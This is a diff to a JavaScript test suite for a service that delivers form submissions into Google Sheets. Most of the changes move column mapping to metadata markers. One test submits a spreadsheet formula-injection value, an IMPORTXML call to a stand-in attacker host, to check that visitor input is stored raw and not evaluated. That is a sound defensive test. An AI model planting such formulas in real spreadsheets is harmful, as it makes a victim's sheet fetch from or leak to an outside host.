@@ -87,7 +87,7 @@ test('a visitor value that looks like a formula is sent RAW, never USER_ENTERED'
   grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
   await deliver(job({ submission: { answers: { name: '=IMPORTXML("https://evil.test")', email: 'a@example.test' } } }));
   const writes = sheetsRequests().filter((request) => request.query.has('valueInputOption'));
-  assert.ok(writes.length >= 2);
+  assert.equal(writes.length, 1, 'only the append takes valueInputOption; headers are written as text cells in the column batch');
   assert.ok(writes.every((request) => request.query.get('valueInputOption') === 'RAW'));
   assert.deepEqual(JSON.parse(appends()[0].body).values[0][2], '=IMPORTXML("https://evil.test")');
 });
@@ -144,10 +144,76 @@ test('a lost append whose re-scan also fails stays outcome-unknown, never report
   assert.deepEqual(await deliver(job({ kit: lost })), { ok: false, error: { code: 'outcome-unknown', retryable: true, outcome: 'unknown' } });
 });
 
-test('missing header: a recorded column whose header is gone is mapping-invalid and nothing is appended', async () => {
-  grid([{ sheetId: TAB_ID, title: 'Contact form', rows: { 1: ['_tovu_submission_id', '_tovu_submitted_at', 'Name'] } }]);
-  const config = { spreadsheetId: BOOK, tabs: { contact: { sheetId: TAB_ID, columns: [{ field: 'name', header: 'Name' }, { field: 'email', header: 'Email' }] } } };
-  assert.deepEqual(await deliver(job({ config })), { ok: false, error: { code: 'mapping-invalid', retryable: false, outcome: 'not-applied' } });
+test('missing Tovu column: a prepared tab whose _tovu_submitted_at header is gone is mapping-invalid and nothing is appended', async () => {
+  grid([{ sheetId: TAB_ID, title: 'Contact form', rows: { 1: ['_tovu_submission_id', 'Name', 'Email'] } }]);
+  assert.deepEqual(await deliver(job()), { ok: false, error: { code: 'mapping-invalid', retryable: false, outcome: 'not-applied' } });
+  assert.equal(appends().length, 0);
+});
+
+test('markers: the first delivery tags each field column with its field id, in the same atomic batch as the headers', async () => {
+  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form', columnCount: 2 }]);
+  assert.equal((await deliver(job())).ok, true);
+  assert.deepEqual(sheets.markersOf(TAB_ID), { name: 2, email: 3 });
+  const batches = sheetsRequests().filter((request) => request.path.endsWith(':batchUpdate'));
+  assert.deepEqual(batches.map((request) => JSON.parse(request.body).requests.map((entry) => Object.keys(entry)[0])), [['appendDimension', 'updateCells', 'createDeveloperMetadata', 'createDeveloperMetadata']]);
+});
+
+test('renamed label: a tagged field keeps its column when the form label and the sheet header both change', async () => {
+  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
+  await deliver(job());
+  sheets.tab(TAB_ID).rows.get(1)[2] = 'Contact name';
+  const renamed = { slug: 'contact', fields: [{ name: 'name', required: true, label: 'Full name' }, FORM.fields[1]] };
+  assert.equal((await deliver(job({ form: renamed, submission: { id: 'sub-2', answers: { name: 'Bo', email: 'bo@example.test' } } }))).ok, true);
+  assert.deepEqual(sheets.rowsOf(TAB_ID), [['_tovu_submission_id', '_tovu_submitted_at', 'Contact name', 'Email'], ['sub-1', '2026-10-20T10:00:00.000Z', 'Ada', 'ada@example.test'], ['sub-2', '2026-10-20T10:00:00.000Z', 'Bo', 'bo@example.test']]);
+});
+
+test('markers win over headers: a tagged column is used even when another column now carries the label', async () => {
+  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form', rows: { 1: ['_tovu_submission_id', '_tovu_submitted_at', 'Email', 'Name'] }, markers: { name: 2, email: 3 } }]);
+  assert.equal((await deliver(job())).ok, true);
+  assert.deepEqual(sheets.rowsOf(TAB_ID)[1], ['sub-1', '2026-10-20T10:00:00.000Z', 'Ada', 'ada@example.test']);
+});
+
+test('a field tagged on two columns is mapping-invalid and nothing is appended', async () => {
+  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form', rows: { 1: HEADERS } }]);
+  sheets.metadata.push({ sheetId: TAB_ID, key: 'tovu_form_field', value: 'name', index: 2 }, { sheetId: TAB_ID, key: 'tovu_form_field', value: 'name', index: 3 });
+  assert.equal((await deliver(job())).error.code, 'mapping-invalid');
+  assert.equal(appends().length, 0);
+});
+
+test('two fields tagged on the same column are mapping-invalid and nothing is appended', async () => {
+  grid([{ sheetId: TAB_ID, title: 'Contact form', rows: { 1: HEADERS }, markers: { name: 2, email: 2 } }]);
+  assert.equal((await deliver(job())).error.code, 'mapping-invalid');
+  assert.equal(appends().length, 0);
+});
+
+test('a column tagged for one field is never taken by another field with that header: the new field gets its own column', async () => {
+  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form', rows: { 1: HEADERS }, markers: { name: 2, email: 3 } }]);
+  const form = { slug: 'contact', fields: [{ name: 'name', required: true, label: 'Full name' }, FORM.fields[1], { name: 'alias', required: false, label: 'Name' }] };
+  assert.equal((await deliver(job({ form, submission: { answers: { name: 'Ada', email: 'a@example.test', alias: 'A' } } }))).ok, true);
+  assert.deepEqual(sheets.rowsOf(TAB_ID)[1], ['sub-1', '2026-10-20T10:00:00.000Z', 'Ada', 'a@example.test', 'A']);
+  assert.deepEqual(sheets.markersOf(TAB_ID), { name: 2, email: 3, alias: 4 });
+});
+
+test('marker-keyed metadata on a row (not one column) is ignored', async () => {
+  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form', rows: { 1: HEADERS } }]);
+  sheets.metadata.push({ sheetId: TAB_ID, key: 'tovu_form_field', value: 'name', index: 0, dimension: 'ROWS' });
+  assert.equal((await deliver(job())).ok, true);
+  assert.deepEqual(sheets.rowsOf(TAB_ID)[1], ['sub-1', '2026-10-20T10:00:00.000Z', 'Ada', 'ada@example.test']);
+});
+
+test('two rows already holding the submission id: delivered with a review note, never appended again', async () => {
+  grid([{ sheetId: TAB_ID, title: 'Contact form', rows: { 1: HEADERS, 2: ['sub-1', 't', 'Ada', 'a@example.test'], 3: ['sub-1', 't', 'Ada', 'a@example.test'] } }]);
+  assert.deepEqual(await deliver(job()), { ok: true, reference: `sheet ${TAB_ID} rows 2, 3 (duplicate submission id: review)` });
+  assert.equal(appends().length, 0);
+});
+
+test('a lost column-preparation batch is outcome-unknown and nothing is appended', async () => {
+  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form' }]);
+  const lost = { ...kitOver(), fetch: async (url, init, options) => {
+    if (url.includes(':batchUpdate')) sheets.failNext = { status: 503 };
+    return kitOver().fetch(url, init, options);
+  } };
+  assert.deepEqual(await deliver(job({ kit: lost })), { ok: false, error: { code: 'outcome-unknown', retryable: true, outcome: 'unknown' } });
   assert.equal(appends().length, 0);
 });
 
@@ -169,11 +235,10 @@ test('two fields that would share a header are mapping-invalid', async () => {
   assert.equal((await deliver(job({ form, submission: { answers: {} } }))).error.code, 'mapping-invalid');
 });
 
-test('added fields become new columns at the end (the grid grows); recorded columns keep their header', async () => {
-  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form', columnCount: 4, rows: { 1: HEADERS, 2: ['sub-0', 't0', 'Bea', 'bea@example.test'] } }]);
+test('added fields become new columns at the end (the grid grows); tagged columns keep their header', async () => {
+  const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form', columnCount: 4, rows: { 1: HEADERS, 2: ['sub-0', 't0', 'Bea', 'bea@example.test'] }, markers: { name: 2, email: 3 } }]);
   const form = { slug: 'contact', fields: [{ name: 'name', required: true, label: 'Full name' }, FORM.fields[1], { name: 'company', required: false, label: 'Company' }] };
-  const config = { spreadsheetId: BOOK, tabs: { contact: { sheetId: TAB_ID, columns: [{ field: 'name', header: 'Name' }, { field: 'email', header: 'Email' }] } } };
-  assert.equal((await deliver(job({ form, config, submission: { answers: { name: 'Ada', email: 'a@example.test', company: 'Acme' } } }))).ok, true);
+  assert.equal((await deliver(job({ form, submission: { answers: { name: 'Ada', email: 'a@example.test', company: 'Acme' } } }))).ok, true);
   assert.deepEqual(sheets.rowsOf(TAB_ID), [[...HEADERS, 'Company'], ['sub-0', 't0', 'Bea', 'bea@example.test'], ['sub-1', '2026-10-20T10:00:00.000Z', 'Ada', 'a@example.test', 'Acme']]);
   assert.equal(sheets.tab(TAB_ID).columnCount, 5);
 });
@@ -209,8 +274,7 @@ test('an unexpected host error is a retryable delivery-failed whose text is drop
 
 test('existing columns in another order: each value lands under its own header', async () => {
   const sheets = grid([{ sheetId: TAB_ID, title: 'Contact form', rows: { 1: ['Email', '_tovu_submitted_at', 'Name', '_tovu_submission_id'] } }]);
-  const config = { spreadsheetId: BOOK, tabs: { contact: { sheetId: TAB_ID, columns: [{ field: 'name', header: 'Name' }, { field: 'email', header: 'Email' }] } } };
-  assert.equal((await deliver(job({ config }))).ok, true);
+  assert.equal((await deliver(job())).ok, true);
   assert.deepEqual(sheets.rowsOf(TAB_ID)[1], ['ada@example.test', '2026-10-20T10:00:00.000Z', 'Ada', 'sub-1']);
 });
 
